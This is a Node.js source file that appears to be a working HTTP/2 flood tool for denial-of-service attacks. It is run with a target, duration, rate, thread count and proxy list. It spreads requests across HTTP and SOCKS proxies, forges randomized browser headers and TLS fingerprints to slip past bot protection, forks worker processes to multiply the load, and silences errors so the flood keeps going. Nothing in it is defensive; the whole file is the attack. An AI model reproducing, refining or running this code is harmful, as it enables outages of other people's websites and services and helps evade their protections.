const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require('os');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`node m1 target time rate thread proxyfile`);
    process.exit();
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    // ... (và nhiều user agent khác)
];

const acceptEncodings = ['gzip', 'deflate', 'br'];
const acceptLanguages = ['en-US', 'en-GB', 'en'];
const cplist = [
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
    // ... (và nhiều cipher suite khác)
];
const alpnProtos = ['h2', 'http/1.1'];
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1", "x25519"];
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET;
const secureProtocol = "TLS_method";
const secureContextOptions = {
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    icecool: process.argv.includes('--icecool'),
    dual: process.argv.includes('--dual'),
    brave: process.argv.includes('--brave')
};

var proxies = readLines(args.proxyFile);
if (args.icecool) {
    proxies = proxies.filter(proxy => proxy.includes(':'));
    console.log(`random proxy: ${proxies.length} proxy loaded`);
}
const parsedTarget = url.parse(args.target);
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const fingerprint = crypto.randomBytes(16).toString('hex');
let cookieJar = {};

function logMessage(message, type = 'info') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${type.toUpperCase()}] ${message}`);
}
// Phần 1 (Đã cung cấp đầy đủ)

class NetSocket {
    constructor() { }
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: parseInt(parsedAddr[1]),
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, args.time * 1000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
const Socker = new NetSocket();

function bexRandomString(min, max) {
    const length = randomIntn(min, max);
    const mask = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => mask[Math.floor(Math.random() * mask.length)]).join('');
}

function sanitizePath(path) {
    return path.replace(/[^a-zA-Z0-9-_./]/g, '');
}

function randomIP() {
    return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
}

function generateHeaders(isBrave) {
    const browserVersion = getRandomInt(110, 120);
    const userAgent = randomElement(userAgents);
    const acceptEncoding = randomElement(acceptEncodings);
    const acceptLanguage = randomElement(acceptLanguages);

    let secChUa = `"Chromium";v="${browserVersion}", "Not)A;Brand";v="24"`;
    if (Math.random() < 0.5) {
        secChUa = `"Not)A;Brand";v="24", "Chromium";v="${browserVersion}"`;
    }

    let secChUaMobile = Math.random() < 0.5 ? "?1" : "?0";
    let secChUaPlatform = Math.random() < 0.5 ? '"Windows"' : '"macOS"';

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path,
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': acceptEncoding,
        'Accept-Language': acceptLanguage,
        "cache-control": "max-age=0",
        'content-type': 'text/html; charset=UTF-8',
        'x-frame-options': 'SAMEORIGIN',
        'referrer-policy': 'same-origin',
        "pragma": "no-cache",
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": secChUaMobile,
        "sec-ch-ua-platform": secChUaPlatform,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "Origin": `https://${parsedTarget.host}`,
        "Referer": `https://${parsedTarget.host}`,
        'sec-ch-ua-full-version-list': `"Chromium";v="${browserVersion}.0.0.0", "Not=A?Brand";v="24.0.0.0", "Google Chrome";v="${browserVersion}.0.0.0"`,
        'sec-ch-prefers-color-scheme': Math.random() < 0.5 ? 'light' : 'dark',
        'sec-ch-ua-wow64': '?0',
        'sec-ch-ua-full-version': `"${browserVersion}.0.0.0"`,
        'cookie': Object.entries(cookieJar).map(([key, value]) => `${key}=${value}`).join('; '),
    };

    const headerKeys = Object.keys(headers);
    const randomizedHeaders = {};
    for (let i = headerKeys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [headerKeys[i], headerKeys[j]] = [headerKeys[j], headerKeys[i]];
    }
    headerKeys.forEach(key => randomizedHeaders[key] = headers[key]);
    return randomizedHeaders;
}

const agents = new Map();

function createAgent(proxy) {
    if (agents.has(proxy)) {
        return agents.get(proxy);
    }

    const proxyParts = proxy.replace("http://", "").replace("socks4://", "").replace("socks5://", "").split(":");
    const proxyHost = proxyParts[0];
    const proxyPort = parseInt(proxyParts[1]);

    let agent;
    if (proxy.startsWith("http://")) {
        agent = new HttpsProxyAgent(proxy);
    } else if (proxy.startsWith("socks4://")) {
        agent = new SocksProxyAgent({ host: proxyHost, port: proxyPort, type: 4 });
    } else if (proxy.startsWith("socks5://")) {
        agent = new SocksProxyAgent({ host: proxyHost, port: proxyPort, type: 5 });
    } else {
        agent = new HttpsProxyAgent(`http://${proxy}`);
    }

    agents.set(proxy, agent);
    return agent;
}
// Phần 1 & 2 (Đã cung cấp đầy đủ)

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const agent = createAgent(proxyAddr);

    const headersbex = generateHeaders(args.brave);

    const tlsOptions = {
        secure: true,
        ALPNProtocols: alpnProtos,
        ciphers: randomElement(cplist),
        sigalgs: sigalgs,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: true,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
        agent: false
    };

    const bexClient = http2.connect(parsedTarget.href, {
        protocol: "https:",
        agent: agent,
        settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false,
        },
        maxSessionMemory: 64000,
        maxDeflateDynamicTableSize: 4294967295,
    });

    bexClient.on('connect', () => {
        logMessage(`Connected to ${parsedTarget.host} through proxy ${proxyAddr}`, 'info');

        const requestRate = args.dual ? args.Rate * 2 : args.Rate;
        const requestInterval = args.icecool ? Math.floor(1000 / requestRate) + randomIntn(100, 200) : 1000 / requestRate;

        const IntervalAttack = setInterval(() => {
            for (let i = 0; i < requestRate; i++) {
                const req = bexClient.request(headersbex);

                req.on('response', (response) => {
                    logMessage(`Received response from ${parsedTarget.host}: ${response.statusCode}`, 'info');
                    if (response.headers['set-cookie']) {
                        response.headers['set-cookie'].forEach(cookieStr => {
                            const parts = cookieStr.split(';');
                            const cookieParts = parts[0].split('=');
                            if (cookieParts.length === 2) {
                                cookieJar[cookieParts[0]] = cookieParts[1];
                            }
                        });
                    }
                    req.close();
                    req.destroy();

                }).on('error', err => {
                    logMessage(`Request error: ${err.message}`, 'error');
                    if (err.code === 'ECONNREFUSED') {
                        logMessage("Error: Connection refused. Server might be down or blocked.", 'error');
                    } else if (err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
                        logMessage("Error: Connection timeout.", 'error');
                    } else if (err.code === 'ENOTFOUND' || err.code === 'EAI_AGAIN' || err.code === 'EAI_NONAME') {
                        logMessage("Error: Host not found.", 'error');
                    } else if (err.message.includes('Proxy')) {
                        logMessage(`Proxy error: ${err.message}`, 'error');
                    }
                    req.destroy();
                });
                req.end();
            }
        }, requestInterval);

        setTimeout(() => {
            clearInterval(IntervalAttack);
            bexClient.destroy();
            logMessage(`Attack finished after ${args.time} seconds.`, 'info');
        }, args.time * 1000);

    }).on('error', (err) => {
        logMessage(`Connection Error: ${err.message}`, 'error');
        if (err.message.includes('Proxy')) {
            logMessage(`Proxy connection error: ${err.message}`, 'error');
        }
        bexClient.destroy();
    });
}

if (cluster.isMaster) {
    console.clear();
    logMessage(`Target: ${process.argv[2]}`, 'info');
    logMessage(`Time: ${process.argv[3]}`, 'info');
    logMessage(`Rate: ${process.argv[4]}`, 'info');
    logMessage(`Threads: ${process.argv[5]}`, 'info');
    logMessage(`Proxyfile: ${process.argv[6]}`, 'info');
    logMessage(`Options: icecool=${args.icecool}, dual=${args.dual}, brave=${args.brave}`, 'info');

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        logMessage('Restarting in ' + RESTART_DELAY + 'ms...', 'warning');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            logMessage('Max RAM usage reached: ' + ramPercentage.toFixed(2) + '%', 'warning');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 10000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(1);
    }, args.time * 1000);

} else {
    setInterval(runFlooder);
}

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);